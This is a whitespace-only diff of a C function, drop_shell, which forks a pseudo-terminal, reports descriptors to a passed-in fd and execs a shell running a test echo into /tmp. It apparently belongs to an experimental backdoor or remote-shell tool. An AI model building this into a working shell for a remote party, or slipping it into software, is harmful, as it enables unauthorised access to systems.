@@ -76,51 +76,51 @@ void fini(void)
 
 void drop_shell(int fd)
 {
-	int master, slave;
+    int master, slave;
     pid_t pid;
     char *argv[] = {SHELL_PATH, "-c", "echo 1234 > /tmp/hehe.txt", NULL};
-	char pty_name[13];    // /proc/sys/kernel/pty/max generally <= 4 chars.
-	char *test = "echo 123 > /tmp/456.txt\n";
+    char pty_name[13];    // /proc/sys/kernel/pty/max generally <= 4 chars.
+    char *test = "echo 123 > /tmp/456.txt\n";
 
-	pid = forkpty(&master, pty_name, NULL, NULL);
+    pid = forkpty(&master, pty_name, NULL, NULL);
 
-	dprintf(fd, "Master FD: %d\n", master);
-	dprintf(fd, "Current FD: %d\n", fd);
+    dprintf(fd, "Master FD: %d\n", master);
+    dprintf(fd, "Current FD: %d\n", fd);
 
-	if(pid == -1)
-		dprintf(fd, "fork() error.");
-	else if(pid == 0)
-	{
-		// dup2(master, STDOUT_FILENO);
-		// dup2(master, STDERR_FILENO);
+    if(pid == -1)
+        dprintf(fd, "fork() error.");
+    else if(pid == 0)
+    {
+        // dup2(master, STDOUT_FILENO);
+        // dup2(master, STDERR_FILENO);
 
-		execv(argv[0], argv);
-	}
-	else if(pid > 0)
-	{
-/*		if(write(master, test, strlen(test)) == -1)
-			dprintf(fd, "write() error.\n");
-		else
-			dprintf(fd, "write() okay.\n"); */
-	}
+        execv(argv[0], argv);
+    }
+    else if(pid > 0)
+    {
+/*        if(write(master, test, strlen(test)) == -1)
+            dprintf(fd, "write() error.\n");
+        else
+            dprintf(fd, "write() okay.\n"); */
+    }
 
-/*	if(openpty(&master, &slave, pty_name, NULL, NULL) == 0)
-	{
-		if((pid = fork()) == 0)
-		{
-			if(login_tty(slave) == 0)
-				execv(argv[0], argv);
-		}
-		else if(pid > 0)
-		{
-			dup2(master, STDIN_FILENO);
-			dup2(master, STDOUT_FILENO);
-			dup2(master, STDERR_FILENO);
-		}
-	} */
+/*    if(openpty(&master, &slave, pty_name, NULL, NULL) == 0)
+    {
+        if((pid = fork()) == 0)
+        {
+            if(login_tty(slave) == 0)
+                execv(argv[0], argv);
+        }
+        else if(pid > 0)
+        {
+            dup2(master, STDIN_FILENO);
+            dup2(master, STDOUT_FILENO);
+            dup2(master, STDERR_FILENO);
+        }
+    } */
 
-	close(master);
-//	close(slave);
+    close(master);
+//    close(slave);
 }
 
 int watchdog(char *name)
